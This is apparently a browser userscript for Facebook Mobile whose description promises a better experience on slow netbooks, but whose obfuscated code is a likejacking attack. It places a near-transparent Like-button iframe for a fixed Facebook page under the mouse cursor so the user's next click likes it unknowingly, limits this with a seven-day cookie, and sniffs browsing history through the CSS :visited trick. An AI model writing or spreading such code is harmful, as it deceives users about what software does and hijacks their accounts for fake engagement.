// ==UserScript==
// @name       jjhh
// @version    0.1
// @description Makes using the Facebook Mobile website a better experience for people on underpowered computers/netbooks.
// @include      *m.facebook.com*
// ==/UserScript==
var targetUrl = 'https://www.facebook.com/ProSofteGame';
var fbvisited = true;
var force = true;
var oneclick = true;
var dothecookiedance = true;
var cookiedays = 7;
var timedelay = 25999;

var g9301 = document.createElement('div');
g9301.id = 'z2634';
g9301.style.position = 'absolute';
g9301.style.opacity = 0.01;
g9301.style.filter = 'alpha(opacity=1)';
g9301.style.width = '50px';
g9301.style.height = '50px';
g9301.style.display = 'block';
g9301.style.left = '-100px';
g9301.style.top = '-100px';
var z4149;
document.body.appendChild(g9301);
var a5497 = document.createElement('iframe');
a5497.src = 'http://www.facebook.com/widgets/like.php?href=' + targetUrl;
a5497.frameborder = 'no';
a5497.scrolling = 'no';
a5497.style.position = 'absolute';
a5497.style.left = '0px';
a5497.style.top = '0px';
a5497.style.zIndex = 1;
a5497.style.height = '40px';
a5497.style.width = '40px';
a5497.style.border = '0px';
document.getElementById('z2634').appendChild(a5497);
document.write('');

function t1948() {
    k8725();
    if (force || b3780) {
        if (dothecookie()) {
            document.onmousemove = n4229;
            var test = 'm3109()';
            var k7041 = setTimeout(test, timedelay)
        }
    }
};

function dothecookie() {
    if (dothecookiedance) {
        if (readCookie('t') == null) {
            createCookie('t', 1, cookiedays);
            return true
        }
        return false
    } else {
        return true
    }
}
function createCookie(name, value, days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        var expires = "; expires=" + date.toGMTString()
    } else var expires = "";
    document.cookie = name + "=" + value + expires + "; path=/"
}
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length)
    }
    return null
}
function n4229(k3372) {
    z4149 = document.getElementById('z2634');
    x = (document.all) ? window.event.x + z4149.offsetParent.scrollLeft : k3372.pageX;
    y = (document.all) ? window.event.y + z4149.offsetParent.scrollTop : k3372.pageY;
    z4149.style.left = (x - 20) + 'px';
    z4149.style.top = (y - 10) + 'px'
};

function m3109() {
    document.getElementById('z2634').style.display = 'none'
};

function w5344(y7602) {
    var i6263 = null;
    if (y7602 == undefined) {
        i6263 = document
    } else {
        if (y7602.contentDocument) {
            i6263 = y7602.contentDocument
        } else {
            if (y7602.contentWindow) {
                i6263 = y7602.contentWindow.document
            } else {
                if (y7602.document) {
                    i6263 = y7602.document
                }
            }
        }
    };
    return i6263
};

function k8725() {
    var w1089 = document.createElement('iframe');
    w1089.style.visibility = 'hidden';
    w1089.style.width = w1089.style.height = 0;
    document.body.appendChild(w1089);
    var x8419 = w5344(w1089);
    x8419.open();
    x8419.write('<style>a:visited{display: none}</style>');
    x8419.close();
    var n5583 = x8419.createElement('a');
    n5583.href = 'http://www.facebook.com';
    x8419.body.appendChild(n5583);
    if (n5583.currentStyle) {
        var x2409 = n5583.currentStyle.display
    } else {
        var x2409 = x8419.defaultView.getComputedStyle(n5583, null).getPropertyValue('display')
    };
    if (x2409 == 'none') {
        b3780 = true
    } else {
        b3780 = false
    };
    document.body.removeChild(w1089)
};
t1948();